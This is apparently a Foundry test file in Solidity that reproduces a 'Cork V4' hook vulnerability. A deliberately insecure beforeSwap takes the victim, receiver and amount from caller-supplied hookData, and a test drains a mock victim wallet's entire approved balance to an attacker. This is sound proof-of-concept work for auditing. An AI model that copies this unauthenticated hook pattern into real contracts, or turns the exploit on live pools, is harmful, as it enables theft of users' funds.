// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ICorkHook {
    function beforeSwap(address sender, bytes calldata hookData) external returns (bytes4, bool);
}

contract TestToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Reproduces the Cork V4 hook class: privileged swap settlement logic is
/// callable outside PoolManager because the hook trusts caller-supplied context.
contract CorkStyleHook {
    address public immutable poolManager;
    IERC20 public immutable token;

    constructor(address _poolManager, IERC20 _token) {
        poolManager = _poolManager;
        token = _token;
    }

    /// @dev Deliberately vulnerable: sender and receiver come from untrusted hookData.
    function beforeSwap(address sender, bytes calldata hookData) external returns (bytes4, bool) {
        (address victimTokenOwner, address attackerReceiver, uint256 amount) =
            abi.decode(hookData, (address, address, uint256));
        require(sender != poolManager, "simulated legitimate path");
        token.transferFrom(victimTokenOwner, attackerReceiver, amount);
        return (ICorkHook.beforeSwap.selector, false);
    }
}

contract VictimWallet {
    ICorkHook public immutable hook;
    IERC20 public immutable token;
    uint256 public constant BALANCE = 3_761e18;

    constructor(ICorkHook _hook, IERC20 _token) {
        hook = _hook;
        token = _token;
        _token.approve(address(_hook), type(uint256).max);
    }
}

contract CorkDirectTheftProofTest is Test {
    address internal attacker = makeAddr("attacker");
    IERC20 internal token;
    CorkStyleHook internal vulnerableHook;
    VictimWallet internal victim;

    function setUp() external {
        vm.label(0x0000000000000000000000000000000000000004, "Canonical V4 PoolManager");
        token = IERC20(address(new TestToken()));
        vulnerableHook = new CorkStyleHook(0x0000000000000000000000000000000000000004, token);
        victim = new VictimWallet(ICorkHook(address(vulnerableHook)), token);
        deal(address(token), address(victim), victim.BALANCE());
    }

    function testUnauthenticatedBeforeSwapStealsExactVictimBalance() external {
        bytes memory spoofedContext = abi.encode(address(victim), attacker, victim.BALANCE());

        assertEq(token.balanceOf(address(victim)), victim.BALANCE());
        assertEq(token.balanceOf(attacker), 0);

        (bytes4 selector, bool skipRemainingHooks) =
            vulnerableHook.beforeSwap(0xEA6f30e360192bae715599E15e2F765B49E4da98, spoofedContext);

        assertEq(selector, ICorkHook.beforeSwap.selector);
        assertFalse(skipRemainingHooks);
        assertEq(token.balanceOf(attacker), victim.BALANCE(), "attacker did not receive exact amount");
        assertEq(token.balanceOf(address(victim)), 0, "victim balance not drained");
    }

    function testPoolManagerSenderIsRejectedInModel() external {
        vm.prank(attacker);
        vm.expectRevert(bytes("simulated legitimate path"));
        vulnerableHook.beforeSwap(
            0x0000000000000000000000000000000000000004,
            abi.encode(address(victim), attacker, 1)
        );
    }
}
